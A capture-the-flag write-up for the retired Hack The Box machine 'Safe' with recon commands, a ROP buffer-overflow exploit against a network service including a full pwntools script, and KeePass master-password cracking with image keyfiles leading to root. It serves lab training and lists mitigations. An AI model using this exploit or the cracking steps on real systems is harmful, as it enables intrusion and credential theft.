---
machine: Safe
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, pwn, rop, buffer-overflow, keepass, privesc]
---

# Safe — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Port `1337` runs `myapp`, a 64-bit ELF that calls `uptime`, reads a string with `gets` and prints it with `puts`. `gets` overflows a `0x70`-byte buffer; the offset to RIP is 120. With no canary, no PIE and NX enabled, a ROP chain leaks `puts` from the GOT, computes the libc base and calls `system("/bin/sh")`. The shell runs as `user`. Their home contains a KeePass database, `MyPasswords.kdbx`; one of the JPG images is a keyfile. Cracking the master password and opening the database with `kpcli` reveals root's password.

## Recon

```bash
nmap -Pn -sCV -p22,80,1337 <IP>
```

- `22` OpenSSH 7.4p1 Debian 9.
- `80` Apache 2.4.25; the default page has a comment pointing to `/myapp`.
- `1337` returns `uptime` and the prompt `What do you want me to echo back?`.

```bash
wget http://<IP>/myapp
file myapp
checksec --file=myapp
```

`myapp` is a dynamically linked, non-stripped `x86-64` ELF. `checksec` shows NX enabled, no canary and no PIE.

## Enumeration

The service listens on `1337` and proxies stdin/stdout to the binary. In `gdb`, `main` does:

```text
system("uptime")
printf("What do you want me to echo back? ")
gets(buffer)   ; buffer at rbp-0x70
puts(buffer)
```

A cyclic pattern puts the RIP offset at 120. `system@plt` is already imported, and `pop rdi; ret` is at `0x40120b`.

## Foothold

Stage one leaks `puts@got` by calling `system(puts@got)` and returns to `main`:

```python
payload = b"A"*120 + p64(pop_rdi) + p64(puts_got) + p64(system_plt) + p64(main)
```

The output contains the `puts` address followed by `not found`. With the libc base, compute `/bin/sh` and send stage two:

```python
payload = b"A"*120 + p64(pop_rdi) + p64(binsh) + p64(system_plt)
```

A `pwntools` script gets a shell as `user`:

```python
from pwn import *
context(os="linux", arch="amd64")
p = remote("<IP>", 1337)
p.recvline()
p.sendline(b"A"*120 + p64(0x40120b) + p64(0x404018) + p64(0x401040) + p64(0x40115f))
leak = u64(p.recvline().strip()[7:-11].ljust(8, b"\x00"))
libc_base = leak - 0x68f90
p.recvline()
p.sendline(b"A"*120 + p64(0x40120b) + p64(libc_base + 0x161c19) + p64(0x401040))
p.interactive()
```

Alternatively, write `/bin/sh` into `.data` with `gets` or use the unused `test()` function; all three variants call `system`.

## Lateral movement

There is no pivot. The initial shell is `user`'s; stabilise it by writing an SSH key to `~/.ssh/authorized_keys`.

## Privilege escalation

The home contains a KeePass database and six photos:

```bash
scp user@<IP>:~/MyPasswords.kdbx .
scp user@<IP>:~/IMG_*.JPG .
```

`keepass2john` produces one hash per possible keyfile; `john` with `rockyou-30` recovers the master password. Try each image until `kpcli` opens the database:

```bash
keepass2john MyPasswords.kdbx > hashes
for img in IMG_*.JPG; do keepass2john -k "$img" MyPasswords.kdbx; done >> hashes
john hashes --wordlist=rockyou-30.txt
kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx
```

`MyPasswords` contains a `Root password` entry. That password works with `su -` and gives a root shell.

## Evidence

- `myapp` using `gets`, with no canary and no PIE.
- Crash at offset 120 and a leaked `puts` address.
- Shell as `user`.
- `MyPasswords.kdbx` and the images; one opens the database.
- `Root password` entry and `id` with UID 0.

## Lessons learned

- A TCP service may be a proxied vulnerable binary, not an HTTP server.
- `gets` without a canary or PIE turns an input bug into a reliable ROP chain.
- Leaking a GOT entry is enough to defeat ASLR with the right libc.
- A password manager is only as strong as its master password and keyfile.

## Mitigations and detection

- Replace `gets` with bounded `fgets` and build with canaries, PIE and full RELRO.
- Do not expose practice binaries in production, especially not setuid or as a service.
- Use strong master passwords and keep keyfiles separate from the database.
- Restrict home directory reads and rotate root's password.
- Detect long patterns on `1337`, service crashes and `system` spawned from `myapp`.

## References

- [0xdf — Safe](https://0xdf.gitlab.io/2019/10/26/htb-safe.html)
- [IppSec — Safe](https://www.youtube.com/watch?v=CO_g3wtC7rk)
- [Hack The Box — Safe](https://app.hackthebox.com/machines/safe)
